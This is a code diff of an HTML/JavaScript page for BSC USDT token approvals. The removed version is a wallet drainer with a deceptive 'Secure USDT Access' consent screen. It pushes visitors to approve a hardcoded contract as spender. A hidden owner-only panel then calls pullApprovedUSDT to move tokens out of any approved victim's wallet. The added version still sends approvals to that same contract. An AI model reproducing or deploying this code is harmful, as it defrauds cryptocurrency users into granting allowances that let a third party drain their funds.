@@ -1,234 +1,113 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<title>Secure Access</title>
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-
-<!-- SAFE ETHERS LOADER -->
-<script>
-(function loadEthers(){
-  if (typeof window.ethers !== "undefined") return;
-  var s = document.createElement("script");
-  s.src = "https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js";
-  s.onload = () => console.log("ethers loaded");
-  document.head.appendChild(s);
-})();
-</script>
+<meta charset="UTF-8">
+<title>USDT Approve | BSC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.min.js"></script>
 
 <style>
-body{
-  margin:0; min-height:100vh;
-  background:radial-gradient(circle at top,#1b1f3b,#070b18);
-  font-family:Segoe UI,Arial; color:#fff;
-  display:flex; align-items:center; justify-content:center;
+body {
+  background:#0b1220;
+  color:#ffffff;
+  font-family:Arial;
+  padding:20px;
 }
-.card{
-  width:100%; max-width:420px;
-  background:rgba(255,255,255,.06);
-  backdrop-filter:blur(14px);
-  border-radius:18px; padding:24px;
-  box-shadow:0 0 40px rgba(0,0,0,.7);
+h2 {
+  text-align:center;
 }
-h2{text-align:center;margin:0 0 10px}
-.btn{
-  width:100%; padding:15px; margin-top:14px;
-  border:none; border-radius:12px;
-  font-size:16px; font-weight:600; cursor:pointer;
-  background:linear-gradient(135deg,#00ffa3,#00b3ff);
-  color:#000;
+input, button {
+  width:100%;
+  padding:14px;
+  margin-top:12px;
+  font-size:16px;
+  border-radius:8px;
 }
-input{
-  width:100%; padding:12px; margin-top:10px;
-  border-radius:10px; border:none; outline:none;
-  background:#0f1430; color:#fff;
+button {
+  background:#16c784;
+  border:none;
+  color:white;
 }
-.small{font-size:13px; opacity:.85; text-align:center; margin-top:10px}
-.hide{display:none}
-.ok{color:#00ffa3}
-
-/* Loader */
-.modal{
-  position:fixed; inset:0; background:rgba(0,0,0,.6);
-  display:flex; align-items:center; justify-content:center;
+.note {
+  font-size:13px;
+  opacity:0.8;
+  margin-top:10px;
 }
-.box{
-  background:#0d132e; border-radius:16px;
-  padding:22px; max-width:360px; text-align:center;
-}
-.loader{
-  width:42px; height:42px; margin:10px auto;
-  border:4px solid #1e244a;
-  border-top:4px solid #00ffa3;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 
 <body>
 
-<div class="card">
-  <h2>Secure USDT Access</h2>
+<h2>USDT Approve (BSC)</h2>
 
-  <button class="btn" onclick="connect()">Connect Wallet</button>
-  <div id="status" class="small">Wallet not connected</div>
+<button onclick="connectWallet()">🔗 Connect Wallet</button>
 
-  <div id="ownerBox" class="hide">
-    <hr style="border:.5px solid #1e244a;margin:18px 0">
-    <input id="from" placeholder="User Wallet Address">
-    <input id="pullAmt" placeholder="USDT Amount">
-    <button class="btn" onclick="pull()">Execute Transfer</button>
-  </div>
+<input type="number" id="amount" placeholder="Enter USDT Amount (example: 10)" />
 
-  <div class="small">BSC Network • Protected Contract</div>
-</div>
+<button onclick="approveUSDT()">✅ Approve USDT</button>
 
-<!-- LOADING -->
-<div id="loading" class="modal hide">
-  <div class="box">
-    <div class="loader"></div>
-    <div class="small">Processing… confirm in wallet</div>
-  </div>
-</div>
-
-<!-- CONSENT -->
-<div id="consent" class="modal hide">
-  <div class="box">
-    <h3>Authorization</h3>
-    <p class="small">
-      Continue to grant secure USDT access to the smart contract.
-    </p>
-    <button class="btn" onclick="autoFlow()">Continue</button>
-  </div>
+<div class="note">
+• Network: BSC Mainnet<br>
+• Token: USDT (BEP20)<br>
+• No unlimited approval
 </div>
 
 <script>
-/* ===== CONFIG ===== */
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const CONTRACT = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1";
-const OWNER = "0x2d0f0934524Cb69B721064807B3ab3133d158E5F";
-const BSC = "0x38";
-/* ================== */
+let provider, signer;
 
-let provider = null;
-let signer = null;
-let user = null;
+// USDT (BSC) Contract
+const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
-function show(id){ document.getElementById(id).classList.remove("hide"); }
-function hide(id){ document.getElementById(id).classList.add("hide"); }
+// YOUR SMART CONTRACT (SPENDER)
+const SPENDER_ADDRESS = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1";
 
-function waitForEthers(cb){
-  if (typeof window.ethers !== "undefined") cb();
-  else setTimeout(()=>waitForEthers(cb), 200);
+// Approve-only ABI
+const ABI = [
+  {
+    "inputs":[
+      {"internalType":"address","name":"spender","type":"address"},
+      {"internalType":"uint256","name":"amount","type":"uint256"}
+    ],
+    "name":"approve",
+    "outputs":[{"internalType":"bool","name":"","type":"bool"}],
+    "stateMutability":"nonpayable",
+    "type":"function"
+  }
+];
+
+async function connectWallet() {
+  if (!window.ethereum) {
+    alert("Wallet not detected. Use MetaMask or Trust Wallet.");
+    return;
+  }
+
+  await ethereum.request({ method: "eth_requestAccounts" });
+
+  const chainId = await ethereum.request({ method: "eth_chainId" });
+  if (chainId !== "0x38") {
+    alert("Please switch to BSC Mainnet");
+    return;
+  }
+
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  signer = provider.getSigner();
+  alert("Wallet Connected Successfully");
 }
 
-async function connect(){
-  waitForEthers(async ()=>{
-    try{
-      if(!window.ethereum) return alert("Wallet not found");
-
-      await ethereum.request({ method:"eth_requestAccounts" });
-
-      const cid = await ethereum.request({ method:"eth_chainId" });
-      if (cid !== BSC){
-        await ethereum.request({
-          method:"wallet_switchEthereumChain",
-          params:[{ chainId:BSC }]
-        });
-      }
-
-      provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-      await provider.ready;
-
-      signer = provider.getSigner();
-      user = (await signer.getAddress()).toLowerCase();
-
-      document.getElementById("status").innerHTML =
-        `<span class="ok">Connected</span>`;
-
-      if (user === OWNER.toLowerCase()){
-        document.getElementById("ownerBox").classList.remove("hide");
-      } else {
-        setTimeout(()=>show("consent"), 300);
-      }
-    }catch(e){
-      alert("Connection failed");
-      console.log(e);
-    }
-  });
-}
-
-async function autoFlow(){
-  if(!signer || !provider){
-    return alert("Please connect wallet first");
+async function approveUSDT() {
+  const amount = document.getElementById("amount").value;
+  if (!amount || amount <= 0) {
+    alert("Enter valid USDT amount");
+    return;
   }
-  try{
-    hide("consent"); show("loading");
-    ...
 
-    const usdt = new ethers.Contract(
-      USDT,
-      [
-        "function approve(address,uint256) returns(bool)",
-        "function decimals() view returns(uint8)"
-      ],
-      signer
-    );
+  const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+  const value = ethers.utils.parseUnits(amount, 18);
 
-    const decimals = await usdt.decimals();
+  const tx = await contract.approve(SPENDER_ADDRESS, value);
+  await tx.wait();
 
-    // ⚠️ SAFE PRACTICE: capped allowance (change amount if needed)
-    const allowanceAmount = "1000"; // 1000 USDT cap
-    const tx = await usdt.approve(
-      CONTRACT,
-      ethers.utils.parseUnits(allowanceAmount, decimals)
-    );
-
-    await tx.wait();
-
-    hide("loading");
-    alert("Access Granted");
-  }catch(e){
-    hide("loading");
-    alert("Transaction cancelled or failed");
-    console.log(e);
-  }
-}
-
-async function pull(){
-  try{
-    if(!signer) return alert("Wallet not ready");
-
-    show("loading");
-
-    const from = document.getElementById("from").value;
-    const amt = document.getElementById("pullAmt").value;
-    if(!from || !amt){
-      hide("loading");
-      return alert("Fill all fields");
-    }
-
-    const c = new ethers.Contract(
-      CONTRACT,
-      ["function pullApprovedUSDT(address,uint256) external"],
-      signer
-    );
-
-    const tx = await c.pullApprovedUSDT(
-      from,
-      ethers.utils.parseUnits(amt, 18)
-    );
-
-    await tx.wait();
-    hide("loading");
-    alert("Transfer Completed");
-  }catch(e){
-    hide("loading");
-    alert("Transfer failed");
-    console.log(e);
-  }
+  alert("USDT Approved Successfully ✅");
 }
 </script>
 
